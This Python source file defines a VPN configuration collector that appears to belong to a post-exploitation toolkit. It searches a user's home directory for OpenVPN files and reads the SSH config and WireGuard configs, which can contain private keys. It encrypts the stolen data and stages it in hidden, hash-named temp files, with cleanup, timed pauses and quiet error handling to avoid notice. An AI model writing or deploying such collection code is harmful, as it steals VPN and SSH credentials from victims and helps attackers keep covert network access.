from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)


class VpnCollector(BaseCollector):
    """
    Collect VPN configurations.

    Targets:
      - ~/.ovpn
      - ~/.ssh/config (proxy settings, VPN-like)
      - Wireguard configs (/etc/wireguard)
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        # 1. OpenVPN config
        search_roots = [Path.home()]
        for root in search_roots:
            for match in root.rglob("*.ovpn"):
                if len(match.parts) - len(root.parts) > 3:
                    continue
                yield ArtifactMetadata(
                    artifact_family="vpn_config",
                    artifact_subtype="openvpn",
                    source_path=str(match),
                    source_platform=os.name,
                    collection_method="file_read",
                )

        # 2. SSH config
        ssh_config = Path.home() / ".ssh" / "config"
        if ssh_config.exists():
            yield ArtifactMetadata(
                artifact_family="vpn_config",
                artifact_subtype="ssh_config",
                source_path=str(ssh_config),
                source_platform=os.name,
                collection_method="file_read",
            )

        # 3. Wireguard configs
        wg_dir = Path("/etc/wireguard")
        if wg_dir.exists():
            for match in wg_dir.rglob("*.conf"):
                yield ArtifactMetadata(
                    artifact_family="vpn_config",
                    artifact_subtype="wireguard",
                    source_path=str(match),
                    source_platform=os.name,
                    collection_method="file_read",
                )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            data = path.read_bytes()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "vpn"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path=str(path),
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("VPN artifact collection error (%s): %s", artifact.source_path, exc)
        return None
